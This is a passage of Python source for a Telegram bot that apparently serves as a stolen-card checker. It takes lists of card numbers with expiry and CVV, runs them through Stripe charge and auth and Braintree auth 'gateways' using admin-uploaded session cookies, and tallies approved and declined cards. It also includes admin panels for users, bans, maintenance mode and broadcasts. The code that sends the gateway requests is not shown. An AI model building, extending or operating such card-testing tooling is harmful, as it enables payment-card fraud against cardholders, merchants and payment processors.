        f"🔄 Resumed {resumed_count} paused session(s).\n"
        f"📊 Card checking will continue from where it left off.\n\n"
        f"💡 Use `/pause` to pause again or `/stop` to terminate.",
        parse_mode='Markdown'
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send a message when the command /help is issued."""
    user_id = update.effective_user.id
    user = update.effective_user
    
    # Maintenance Check
    if is_maintenance_mode() and not is_admin(user_id):
        await update.message.reply_text(
            "🚧 **BOT UNDER MAINTENANCE** 🚧\n\n"
            "Sorry! The bot is temporarily down for maintenance. Please try again later.\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👨‍💻 Contact Admin: {ADMIN_USERNAME}",
            parse_mode='Markdown'
        )
        return
        
    # Group Punishment Check
    chat_id = update.effective_chat.id
    if str(chat_id).startswith('-'):
        punished, reason = is_group_punished(chat_id)
        if punished:
            await update.message.reply_text(reason, parse_mode='Markdown')
            return

    # Track user activity
    update_user_activity(user_id, username=user.username, first_name=user.first_name, last_name=user.last_name)
    increment_feature_usage(user_id, 'help', chat_id=chat_id)
    
    # Simplified limits
    if is_admin(user_id):
        limits_text = "📊 **Your Limits:** ♾️ Unlimited"
    else:
        limits_text = "📊 **Your Limits:** File: 500 | Multi: 100"

    
    help_text = f"""
🆘 **CARD CHECKER BOT - HELP**
━━━━━━━━━━━━━━━━━━━━━━━━

{limits_text}

**💳 How to Check Cards:**

1️⃣ **File Upload (.txt)**
   • Format: `CC|MM|YY|CVV`
   • One card per line

2️⃣ **Paste Cards Directly**
   • Single or multiple cards
   • Auto-detected

3️⃣ **BIN Lookup:** `/bin 434527`

4️⃣ **Stripe Charge:** `/sb` (then send cards)
5️⃣ **Stripe Auth:** `/au` (then send cards)

**📝 Commands:**
`/start` - Welcome message
`/help` - This help
`/bin` - BIN info
`/sb` - Stripe Charge
`/au` - Stripe Auth
`/pause` `/resume` `/stop` - Control

━━━━━━━━━━━━━━━━━━━━━━━━
📢 Contact: {ADMIN_USERNAME}
"""

    if is_admin(user_id):
        help_text += "\n👑 **Admin:** /admin"

    await update.message.reply_text(help_text, parse_mode='Markdown')


# ============ ADMIN PANEL SYSTEM ============
async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /admin command - Show admin panel with buttons."""
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("🚫 ACCESS DENIED - Admin only!")
        return
    
    await show_admin_panel(update, context, page=1)


async def show_admin_panel(update_or_query, context, page=1):
    """Helper to render admin panel pages with gateway management."""
    auth_status = is_authorization_enabled()
    maintenance_status = is_maintenance_mode()
    online_count = sum(1 for stats in user_tracking.values() if is_user_online(stats.get('last_active', '')))
    
    keyboard = []
    
    if page == 1:
        auth_button_text = "🔓 Disable Auth" if auth_status else "🔐 Enable Auth"
        maint_button_text = "🛠️ Disable Maint" if maintenance_status else "🚧 Enable Maint"
        
        keyboard = [
            [
                InlineKeyboardButton("👤 Add User", callback_data="admin_adduser"),
                InlineKeyboardButton("🗑️ Remove User", callback_data="admin_removeuser")
            ],
            [
                InlineKeyboardButton("📋 List Authorized", callback_data="admin_listusers"),
                InlineKeyboardButton("📊 Bot Stats", callback_data="admin_stats")
            ],
            [
                InlineKeyboardButton("🟢 Online Users", callback_data="admin_onlineusers"),
                InlineKeyboardButton("🔍 User Lookup", callback_data="admin_userlookup")
            ],
            [
                InlineKeyboardButton("🔌 Gateways", callback_data="admin_gateways"),
                InlineKeyboardButton("📨 Send to User", callback_data="admin_sendto")
            ],
            [
                InlineKeyboardButton(auth_button_text, callback_data="admin_toggleauth"),
                InlineKeyboardButton(maint_button_text, callback_data="admin_togglemaint")
            ],
            [
                InlineKeyboardButton("➡️ Next Page", callback_data="admin_page_2"),
                InlineKeyboardButton("❌ Close Panel", callback_data="admin_close")
            ]
        ]
        
        auth_mode_text = "🔐 ENABLED (Private Mode)" if auth_status else "🔓 DISABLED (All Users Allowed)"
        
        text = (
            f"👑🔥 ADMIN CONTROL PANEL 🔥👑\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👋 Welcome Admin! 👋\n"
            f"🔒 Authorized Users: {len(authorized_users)}\n"
            f"📊 Tracked Users: {len(user_tracking)}\n"
            f"🟢 Online Now: {online_count}\n"
            f"🔑 Auth Mode: {auth_mode_text}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🎮 Select an action below:"
        )
        
    elif page == 2:
        keyboard = [
            [
                InlineKeyboardButton("📊 All Users", callback_data="admin_allusers"),
                InlineKeyboardButton("👥 All Groups", callback_data="admin_allgroups")
            ],
            [
                InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast"),
                InlineKeyboardButton("🚫 Punish User", callback_data="admin_punish")
            ],
            [
                InlineKeyboardButton("⬅️ Prev Page", callback_data="admin_page_1"),
                InlineKeyboardButton("❌ Close", callback_data="admin_close")
            ]
        ]
        
        text = (
            f"⚙️ **ADMIN OPTIONS (Page 2)** ⚙️\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 User Management & Broadcasting\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Select an action below:"
        )

    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if hasattr(update_or_query, 'edit_message_text'):
        await update_or_query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
    else:
        await update_or_query.message.reply_text(text, reply_markup=reply_markup, parse_mode='Markdown')

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle button callbacks for admin panel and gateway management."""
    query = update.callback_query
    user_id = query.from_user.id
    
    print(f"DEBUG: Button callback received - Data: {query.data}, User: {user_id}")
    print(f"DEBUG: Maintenance Mode: {is_maintenance_mode()}, Is Admin: {is_admin(user_id)}")
    
    # Maintenance Check
    if is_maintenance_mode() and not is_admin(user_id):
        if not query.data.startswith("admin_"):
            await query.answer("🚧 Bot is under maintenance. Please try again later.", show_alert=True)
            return

    try:
        await query.answer()
    except Exception as e:
        print(f"DEBUG: Error in query.answer(): {e}")

    # Handle file checking buttons
    if query.data.startswith("check_all_"):
        temp_file_path = query.data.replace("check_all_", "")
        
        try:
            # Read the file again
            with open(temp_file_path, 'r', encoding='utf-8') as f:
                valid_cards = [line.strip() for line in f if line.strip()]
            
            await query.edit_message_text("🚀 **Starting card check...**", parse_mode='Markdown')
            # Run card checking as background task to keep bot responsive
            asyncio.create_task(start_checking(query, context, temp_file_path, valid_cards))
        except Exception as e:
            await query.edit_message_text(f"❌ Error starting check: {str(e)}", parse_mode='Markdown')
        return

    elif query.data == "cancel_check":
        await query.edit_message_text("❌ **Check cancelled.**", parse_mode='Markdown')
        return
    
    if query.data.startswith("admin_"):
        print(f"DEBUG: Admin block entered. Query: {repr(query.data)}")
        if not is_admin(user_id):
            await query.edit_message_text("🚫 **ACCESS DENIED** - Admin only!", parse_mode='Markdown')
            return

        # FORCE GATEWAYS HANDLER (Top Priority)
        if query.data == "admin_gateways":
            print("DEBUG: Executing FORCE admin_gateways handler")
            try:
                sb_status = get_gateway_status_text('sb')
                au_status = get_gateway_status_text('au')
                ba_status = get_gateway_status_text('ba')
                
                text = (
                    f"🔌 **GATEWAY MANAGEMENT** 🔌\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"⚡ **Stripe Charge ($2):** {sb_status}\n"
                    f"💎 **Stripe Auth:** {au_status}\n"
                    f"🔐 **Braintree Auth:** {ba_status}\n\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"Click a gateway to toggle ON/OFF:"
                )
                
                keyboard = [
                    [InlineKeyboardButton(f"⚡ Stripe Charge - {sb_status}", callback_data="gateway_toggle_sb")],
                    [InlineKeyboardButton(f"💎 Stripe Auth - {au_status}", callback_data="gateway_toggle_au")],
                    [InlineKeyboardButton(f"🔐 Braintree Auth - {ba_status}", callback_data="gateway_toggle_ba")],
                    [InlineKeyboardButton("🔙 Back to Admin Panel", callback_data="admin_back")]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                
                await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
                return
            except Exception as e:
                print(f"ERROR in admin_gateways: {e}")
                import traceback
                traceback.print_exc()
                await query.answer(f"Error: {str(e)[:100]}", show_alert=True)
                return
        
        if query.data == "admin_adduser":
            await query.edit_message_text(
                "👤 **ADD USER**\n\n"
                "To add a new user, use the command:\n"
                "`/adduser <user_id>`\n\n"
                "**Example:** `/adduser 123456789`\n\n"
                "💡 **Tip:** Ask the user to send `/start` to get their User ID.",
                parse_mode='Markdown'
            )
        
        elif query.data == "admin_removeuser":
            await query.edit_message_text(
                "🗑️ **REMOVE USER**\n\n"
                "To remove a user, use the command:\n"
                "`/removeuser <user_id>`\n\n"
                "**Example:** `/removeuser 123456789`\n\n"
                "⚠️ **Note:** You cannot remove the main admin.",
                parse_mode='Markdown'
            )
        
        elif query.data == "admin_listusers":
            users_list = "👑 **AUTHORIZED USERS LIST**\n\n"
            for i, uid in enumerate(sorted(authorized_users), 1):
                status = "👑 ADMIN" if uid == ADMIN_ID else "✅ USER"
                users_list += f"{i}. `{uid}` - {status}\n"
            
            users_list += f"\n🎯 **Total Users:** {len(authorized_users)}"
            
            keyboard = [[InlineKeyboardButton("🔙 Back to Admin Panel", callback_data="admin_back")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await query.edit_message_text(users_list, reply_markup=reply_markup, parse_mode='Markdown')
        
        elif query.data == "admin_stats":
            online_count = sum(1 for stats in user_tracking.values() if is_user_online(stats.get('last_active', '')))
            total_cards = sum(stats.get('total_cards_checked', 0) for stats in user_tracking.values())
            total_approved = sum(stats.get('cards_approved', 0) for stats in user_tracking.values())
            total_declined = sum(stats.get('cards_declined', 0) for stats in user_tracking.values())
            
            stats_text = (
                f"📊 BOT STATISTICS\n\n"
                f"👑 Admin: {ADMIN_ID}\n"
                f"👥 Authorized Users: {len(authorized_users)}\n"
                f"📊 Tracked Users: {len(user_tracking)}\n"
                f"🟢 Online Now: {online_count}\n"
                f"🔑 Auth Mode: {'ENABLED' if is_authorization_enabled() else 'DISABLED'}\n\n"
                f"💳 Card Statistics:\n"
                f"   • Total Checked: {total_cards}\n"
                f"   • ✅ Approved: {total_approved}\n"
                f"   • ❌ Declined: {total_declined}\n"
                f"   • 📈 Success Rate: {(total_approved/total_cards*100) if total_cards > 0 else 0:.1f}%\n\n"
                f"🎯 Features Active:\n"
                f"• Card Checking ✅\n"
                f"• BIN Lookup ✅\n"
                f"• File Upload ✅\n"
                f"• Gateway Management ✅"
            )
            
            keyboard = [[InlineKeyboardButton("🔙 Back to Admin Panel", callback_data="admin_back")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await query.edit_message_text(stats_text, reply_markup=reply_markup)
        
        elif query.data == "admin_gateways":
            try:
                # Debug alert
                # await query.answer("🔄 Loading...", show_alert=False)
                print("DEBUG: admin_gateways handler called!")
                
                sb_status = get_gateway_status_text('sb')
                au_status = get_gateway_status_text('au')
                ba_status = get_gateway_status_text('ba')
                
                print(f"DEBUG: Statuses - SB: {sb_status}, AU: {au_status}, BA: {ba_status}")
                
                text = (
                    f"🔌 **GATEWAY MANAGEMENT** 🔌\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"⚡ **Stripe Charge ($2):** {sb_status}\n"
                    f"💎 **Stripe Auth:** {au_status}\n"
                    f"🔐 **Braintree Auth:** {ba_status}\n\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"Click a gateway to toggle ON/OFF:"
                )
                
                keyboard = [
                    [InlineKeyboardButton(f"⚡ Stripe Charge - {sb_status}", callback_data="gateway_toggle_sb")],
                    [InlineKeyboardButton(f"💎 Stripe Auth - {au_status}", callback_data="gateway_toggle_au")],
                    [InlineKeyboardButton(f"🔐 Braintree Auth - {ba_status}", callback_data="gateway_toggle_ba")],
                    [InlineKeyboardButton("🔙 Back to Admin Panel", callback_data="admin_back")]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                
                await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
                
            except Exception as e:
                print(f"ERROR in admin_gateways: {e}")
                import traceback
                traceback.print_exc()
                await query.answer(f"❌ Error: {str(e)[:100]}", show_alert=True)

        elif query.data == "admin_onlineusers":
            online_users = [(uid, stats) for uid, stats in user_tracking.items() 
                           if is_user_online(stats.get('last_active', ''))]
            
            if not online_users:
                msg = "🔴 **NO ONLINE USERS** 🔴\n\nNo users have been active in the last 5 minutes."
            else:
                msg = "🟢 **ONLINE USERS** 🟢\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                
                for i, (uid, stats) in enumerate(online_users[:10], 1):
                    username = stats.get('username') or 'N/A'
                    first_name = stats.get('first_name') or 'Unknown'
                    time_ago = get_time_ago(stats.get('last_active', ''))
                    
                    msg += f"{i}. 🟢 {first_name} (@{username})\n"
                    msg += f"   ID: `{uid}` | Active: {time_ago}\n\n"
                
                msg += f"✨ **Total Online:** {len(online_users)} users"
            
            keyboard = [[InlineKeyboardButton("🔙 Back to Admin Panel", callback_data="admin_back")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(msg, reply_markup=reply_markup, parse_mode='Markdown')
        
        elif query.data == "admin_userlookup":
            await query.edit_message_text(
                "🔍 **USER LOOKUP**\n\n"
                "To view detailed stats for a specific user, use the command:\n"
                "`/userstats <user_id>`\n\n"
                "**Example:** `/userstats 123456789`\n\n"
                "💡 **Tip:** Use `/allusers` to see all user IDs.",
                parse_mode='Markdown'
            )
        
        elif query.data == "admin_toggleauth":
            new_state = toggle_authorization()
            
            if new_state:
                msg = "🔐 AUTHORIZATION ENABLED 🔐\n\n✅ Authorization is now ON.\n⚠️ Only authorized users can use the bot.\n📝 Use /adduser to add users."
            else:
                msg = "🔓 AUTHORIZATION DISABLED 🔓\n\n✅ Authorization is now OFF.\n🌐 All users can now use the bot.\n📊 User activity will still be tracked."
            
            keyboard = [[InlineKeyboardButton("🔙 Back to Admin Panel", callback_data="admin_back")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(msg, reply_markup=reply_markup)
        
        elif query.data == "admin_togglemaint":
            new_state = toggle_maintenance()
            status_text = "ENABLED 🚧" if new_state else "DISABLED ✅"
            await query.edit_message_text(
                f"🚧 **MAINTENANCE MODE {status_text}**\n\n"
                f"Maintenance is now {'ON' if new_state else 'OFF'}.\n"
                f"{'Normal users cannot use the bot.' if new_state else 'All users can use the bot now.'}",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_back")]]),
                parse_mode='Markdown'
            )
        
        elif query.data == "admin_sendto":
            await query.edit_message_text(
                "📨 SEND TO SPECIFIC USER\n\nUse the command:\n/sendto <user_id> <message>\n\nExample:\n/sendto 123456789 Hello!\n\nUse /allusers to see user IDs",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_back")]])
            )
        
        elif query.data == "admin_broadcast":
            msg = "📢 BROADCAST TO ALL USERS\n\nUse the command:\n/broadcast Your message here\n\nTo send photo:\n1. Send or forward a photo\n2. Reply to it with /broadcast\n\n📊 Total users: " + str(len(user_tracking))
            
            keyboard = [[InlineKeyboardButton("🔙 Back to Admin Panel", callback_data="admin_back")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(msg, reply_markup=reply_markup)
        
        elif query.data == "admin_punish":
            await query.edit_message_text(
                "🚫 **USER PUNISHMENT SYSTEM** 🚫\n\n"
                "Use commands to punish users:\n\n"
                "🔨 **Permanent Ban:**\n`/ban <user_id>`\n\n"
                "⏳ **Timed Suspension:**\n`/suspend <user_id> <time>`\n*Example:* `/suspend 12345 1d 12h`\n\n"
                "✅ **Unban/Remove Punish:**\n`/unban <user_id>`",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_back")]]),
                parse_mode='Markdown'
            )
        
        elif query.data == "admin_allusers":
            if not user_tracking:
                msg = "📭 No users tracked yet!"
            else:
                msg = "📊 **ALL USERS STATS** 📊\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                
                for i, (uid, stats) in enumerate(list(user_tracking.items())[:10], 1):
                    username = stats.get('username') or 'N/A'
                    first_name = stats.get('first_name') or 'Unknown'
                    online_status = "🟢" if is_user_online(stats.get('last_active', '')) else "🔴"
                    cards = stats.get('total_cards_checked', 0)
                    
                    msg += f"{i}. {online_status} {first_name} (@{username})\n   `{uid}` | 📊 {cards} cards\n\n"
                
                if len(user_tracking) > 10:
                    msg += f"... and {len(user_tracking) - 10} more users.\nUse `/allusers` for full list.\n"
                
                msg += f"\n📈 **Total:** {len(user_tracking)} users"
            
            keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="admin_back")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(msg, reply_markup=reply_markup, parse_mode='Markdown')
        
        elif query.data == "admin_allgroups":
            if not group_tracking:
                msg = "📭 No groups tracked yet."
            else:
                msg = "📊 **ALL TRACKED GROUPS** 📊\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                
                for i, (gid, stats) in enumerate(list(group_tracking.items())[:10], 1):
                    title = stats.get('title', 'Unknown Group')
                    status = "🔴 BANNED" if stats.get('banned') else "🟢 ACTIVE"
                    cards = stats.get('total_cards_checked', 0)
                    
                    msg += f"{i}. 🏰 {title}\n   `{gid}` | {status} | 📊 {cards} cards\n\n"
                
                if len(group_tracking) > 10:
                    msg += f"... and {len(group_tracking) - 10} more groups.\n"
                
                msg += f"\n🏰 **Total:** {len(group_tracking)} groups"
            
            keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="admin_back")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(msg, reply_markup=reply_markup, parse_mode='Markdown')
        
        elif query.data == "admin_page_1":
            await show_admin_panel(query, context, page=1)
        elif query.data == "admin_page_2":
            await show_admin_panel(query, context, page=2)
        
        elif query.data == "admin_back":
            await show_admin_panel(query, context, page=1)
        
        elif query.data == "admin_close":
            await query.edit_message_text("👑 Admin panel closed. 👑")
    
    elif query.data.startswith("gateway_toggle_"):
        if not is_admin(user_id):
            await query.answer("🚫 Admin only!", show_alert=True)
            return
        
        gateway = query.data.replace("gateway_toggle_", "")
        new_state = toggle_gateway(gateway)
        
        gateway_names = {
            'sb': 'Stripe Charge ($2) ⚡',
            'au': 'Stripe Auth 💎',
            'ba': 'Braintree Auth 🔐'
        }
        
        status = "ENABLED 🟢" if new_state else "DISABLED 🔴"
        await query.answer(f"{gateway_names.get(gateway, gateway.upper())} {status}", show_alert=True)
        
        sb_status = get_gateway_status_text('sb')
        au_status = get_gateway_status_text('au')
        ba_status = get_gateway_status_text('ba')
        
        text = (
            f"🔌 **GATEWAY MANAGEMENT** 🔌\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"⚡ **Stripe Charge ($2):** {sb_status}\n"
            f"💎 **Stripe Auth:** {au_status}\n"
            f"🔐 **Braintree Auth:** {ba_status}\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Click a gateway to toggle ON/OFF:"
        )
        
        keyboard = [
            [InlineKeyboardButton(f"⚡ Stripe Charge - {sb_status}", callback_data="gateway_toggle_sb")],
            [InlineKeyboardButton(f"💎 Stripe Auth - {au_status}", callback_data="gateway_toggle_au")],
            [InlineKeyboardButton(f"🔐 Braintree Auth - {ba_status}", callback_data="gateway_toggle_ba")],
            [InlineKeyboardButton("🔙 Back to Admin Panel", callback_data="admin_back")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle document uploads."""
    user_id = update.effective_user.id
    user = update.effective_user
    
    # Username Check
    if not user.username:
        await update.message.reply_text("❌ You must have a Telegram username to use this bot.")
        return
    
    # Punishment Check
    punished, reason = is_user_punished(user_id)
    if punished:
        await update.message.reply_text(reason, parse_mode='Markdown')
        return
        
    # Group Punishment Check
    chat_id = update.effective_chat.id
    if str(chat_id).startswith('-'):
        punished, reason = is_group_punished(chat_id)
        if punished:
            await update.message.reply_text(reason, parse_mode='Markdown')
            return
    
    # Track user activity
    update_user_activity(user_id, username=user.username, first_name=user.first_name, last_name=user.last_name)
    increment_feature_usage(user_id, 'file_upload', chat_id=chat_id)
    
    # Maintenance Check
    if is_maintenance_mode() and not is_admin(user_id):
        await update.message.reply_text(
            "🚧 **BOT UNDER MAINTENANCE** 🚧\n\n"
            "Sorry! The bot is temporarily down for maintenance. Please try again later.\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👨‍💻 Contact Admin: {ADMIN_USERNAME}",
            parse_mode='Markdown'
        )
        return
        
    if not is_authorized(user_id):
        await update.message.reply_text("🚫 **ACCESS DENIED** - Unauthorized user!")
        return
    
    document = update.message.document
    
    # Check if it's a valid file type
    file_name = document.file_name.lower()
    
    # Handle JSON files for gateway cookies (Admin only)
    if file_name.endswith('.json') and is_admin(user_id):
        try:
            # Download the file
            file = await context.bot.get_file(document.file_id)
            
            with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.json') as temp_file:
                await file.download_to_drive(temp_file.name)
                temp_file_path = temp_file.name
            
            # Read and parse JSON
            with open(temp_file_path, 'r', encoding='utf-8') as f:
                content = f.read()
            
            os.unlink(temp_file_path)
            
            # Try to parse JSON
            import ast
            try:
                cookies_data = json.loads(content)
            except json.JSONDecodeError:
                try:
                    cookies_data = ast.literal_eval(content)
                except:
                    await update.message.reply_text("❌ Invalid JSON format in file!")
                    return
            
            if not isinstance(cookies_data, dict):
                await update.message.reply_text("❌ File must contain a JSON object (dictionary)!")
                return
            
            if not cookies_data:
                await update.message.reply_text("❌ Empty cookies file!")
                return
            
            # Store cookies temporarily and ask for slot
            context.user_data['pending_json_cookies'] = cookies_data
            context.user_data['waiting_for_json_slot'] = True
            
            await update.message.reply_text(
                f"🍪 **JSON Cookies Loaded!**\n\n"
                f"📊 Found **{len(cookies_data)}** cookies\n\n"
                f"Which slot do you want to add these to? (1-10)",
                parse_mode='Markdown'
            )
            return
            
        except Exception as e:
            await update.message.reply_text(f"❌ Error reading JSON file: {e}")
            return
    
    # Handle TXT files for cookies (Admin only) - if filename contains 'cookie'
    if file_name.endswith('.txt') and is_admin(user_id) and 'cookie' in file_name.lower():
        try:
            # Download the file
            file = await context.bot.get_file(document.file_id)
            
            with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.txt') as temp_file:
                await file.download_to_drive(temp_file.name)
                temp_file_path = temp_file.name
            
            # Read file content
            with open(temp_file_path, 'r', encoding='utf-8') as f:
                content = f.read()
            
            os.unlink(temp_file_path)
            
            # Try to parse as JSON/dict
            import ast
            import re
            
            content = content.strip()
            
            # Remove markdown code blocks if present
            if content.startswith("```"):
                content = content.strip("`").replace("json", "").replace("python", "").strip()
            
            # Add braces if missing
            if not content.startswith("{"):
                content = "{" + content
            if not content.endswith("}"):
                content = content + "}"
            
            try:
                cookies_data = json.loads(content)
            except json.JSONDecodeError:
                try:
                    cookies_data = ast.literal_eval(content)
                except:
                    # Try regex extraction
                    cookies_data = {}
                    for match in re.finditer(r'["\']?([^"\':]+)["\']?\s*:\s*["\']([^"\',}]+)["\']', content):
                        key, value = match.groups()
                        cookies_data[key.strip()] = value.strip()
                    
                    if not cookies_data:
                        await update.message.reply_text("❌ Could not parse cookies from TXT file!")
                        return
            
            if not isinstance(cookies_data, dict) or not cookies_data:
                await update.message.reply_text("❌ Invalid cookies format in TXT file!")
                return
            
            # Store cookies temporarily and ask for slot
            context.user_data['pending_json_cookies'] = cookies_data
            context.user_data['waiting_for_json_slot'] = True
            
            await update.message.reply_text(
                f"🍪 **Cookies Loaded from TXT!**\n\n"
                f"📊 Found **{len(cookies_data)}** cookies\n\n"
                f"Which slot do you want to add these to? (1-10)",
                parse_mode='Markdown'
            )
            return
            
        except Exception as e:
            await update.message.reply_text(f"❌ Error reading cookies TXT file: {e}")
            return
    
    if not file_name.endswith('.txt'):
        if file_name.endswith('.json'):
            await update.message.reply_text("❌ JSON file upload is admin-only feature!")
        else:
            await update.message.reply_text("❌ Please upload a .txt file only!")
        return
    
    # Check file size (max 20MB)
    if document.file_size > 20 * 1024 * 1024:
        await update.message.reply_text("❌ File too large! Please upload files smaller than 20MB.")
        return
    
    try:
        # Download the file
        file = await context.bot.get_file(document.file_id)
        
        # Create temporary file
        with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.txt') as temp_file:
            await file.download_to_drive(temp_file.name)
            temp_file_path = temp_file.name
        
        # Read and validate the file
        with open(temp_file_path, 'r', encoding='utf-8') as f:
            lines = [line.strip() for line in f if line.strip()]
        
        if not lines:
            await update.message.reply_text("❌ File is empty or contains no valid data!")
            os.unlink(temp_file_path)
            return
        
        # Validate card format
        valid_cards = []
        invalid_lines = []
        
        for i, line in enumerate(lines, 1):
            parts = line.split('|')
            if len(parts) != 4:
                invalid_lines.append(f"Line {i}: Invalid format")
                continue
            
            cc, mm, yy, cvv = parts
            if not (cc.isdigit() and len(cc) >= 13 and len(cc) <= 19):
                invalid_lines.append(f"Line {i}: Invalid card number")
                continue
            if not (mm.isdigit() and 1 <= int(mm) <= 12):
                invalid_lines.append(f"Line {i}: Invalid month")
                continue
            if not (yy.isdigit() and (len(yy) == 2 or len(yy) == 4)):
                invalid_lines.append(f"Line {i}: Invalid year")
                continue
            
            # Convert 4-digit year to 2-digit for processing
            if len(yy) == 4:
                yy = yy[-2:]
            if not (cvv.isdigit() and 3 <= len(cvv) <= 4):
                invalid_lines.append(f"Line {i}: Invalid CVV")
                continue
            
            # Store the normalized card format (with 2-digit year)
            normalized_card = f"{cc}|{mm}|{yy}|{cvv}"
            valid_cards.append(normalized_card)
        
        if invalid_lines:
            error_msg = "❌ Invalid card format found:\n\n"
            error_msg += "\n".join(invalid_lines[:10])  # Show first 10 errors
            if len(invalid_lines) > 10:
                error_msg += f"\n... and {len(invalid_lines) - 10} more errors"
            error_msg += "\n\nExpected format: `CC|MM|YY|CVV` or `CC|MM|YYYY|CVV`"
            await update.message.reply_text(error_msg, parse_mode='Markdown')
            os.unlink(temp_file_path)
            return
        
        # ENFORCE CARD LIMITS (500 for all users except admin)
        user_id = update.effective_user.id
        
        if not is_admin(user_id):
            max_cards = 500
            if len(valid_cards) > max_cards:
                await update.message.reply_text(
                    f"⚠️ **LIMIT EXCEEDED**\n\n"
                    f"📊 Your limit: **{max_cards}** cards\n"
                    f"📁 File contains: **{len(valid_cards)}** cards\n\n"

                    f"Please reduce the number of cards and try again.",
                    parse_mode='Markdown'
                )
                os.unlink(temp_file_path)
                return
        
        if context.user_data.get('waiting_for_sb'):
            context.user_data['waiting_for_sb'] = False # Reset flag
            asyncio.create_task(start_checking(update, context, temp_file_path, valid_cards, gate_priority='sb'))
            return

        # Check for cookie update (Admin only)
        if context.user_data.get('waiting_for_cookie_private') or context.user_data.get('waiting_for_cookie_public'):
            try:
                # Read file content
                with open(temp_file_path, 'r', encoding='utf-8') as f:
                    content = f.read()
                
                # Try parsing as JSON first
                try:
                    new_cookies = json.loads(content)
                except:
                    # Try parsing manual dict string format roughly
                    import ast
                    new_cookies = ast.literal_eval(content)
                
                if not isinstance(new_cookies, dict):
                    raise ValueError("Content is not a dictionary")
                    
                target = 'private_cookies' if context.user_data.get('waiting_for_cookie_private') else 'public_cookies'
                gateway_cookies[target] = new_cookies
                save_gateway_cookies()
                
                await update.message.reply_text(f"✅ **{target.replace('_', ' ').upper()} UPDATED!**")
                context.user_data['waiting_for_cookie_private'] = False
                context.user_data['waiting_for_cookie_public'] = False
                
            except Exception as e:
                await update.message.reply_text(f"❌ Failed to parse cookies: {e}")
            
            os.unlink(temp_file_path)
            return
        else:
            # Determining Gateway Logic for file uploads
            # Default to private if user is admin or in private group/DM list
            # If public group, use public check
            
            chat_id = update.effective_chat.id
            # Start checking immediately (uses load-balanced gateway)
            asyncio.create_task(start_checking(update, context, temp_file_path, valid_cards))
            
    except Exception as e:
        try:
            await send_message_with_retry(update, context, update.message.chat_id, f"❌ Error processing file: {str(e)}")
        except:
            pass  # If even retry fails, just continue
        if 'temp_file_path' in locals():
            try:
                os.unlink(temp_file_path)
            except:
                pass

async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle text messages containing single or multiple card data."""
    user_id = update.effective_user.id
    user = update.effective_user
    
    # Username Check
    if not user.username:
        if not update.message.text.startswith('/'): # Only block if it's not a command (commands are handled by their own handlers)
            await update.message.reply_text("❌ You must have a Telegram username to use this bot.")
        return
    
    # Track user activity
    update_user_activity(user_id, username=user.username, first_name=user.first_name, last_name=user.last_name)
    
    # Punishment Check
    punished, reason = is_user_punished(user_id)
    if punished:
        await update.message.reply_text(reason, parse_mode='Markdown')
        return
        
    # Group Punishment Check
    chat_id = update.effective_chat.id
    if str(chat_id).startswith('-'):
        punished, reason = is_group_punished(chat_id)
        if punished:
            await update.message.reply_text(reason, parse_mode='Markdown')
            return
    
    # Maintenance Check
    if is_maintenance_mode() and not is_admin(user_id):
        # Allow only admin to bypass maintenance
        await update.message.reply_text(
            "🚧 **BOT UNDER MAINTENANCE** 🚧\n\n"
            "Sorry! The bot is temporarily down for maintenance. Please try again later.\n\n"
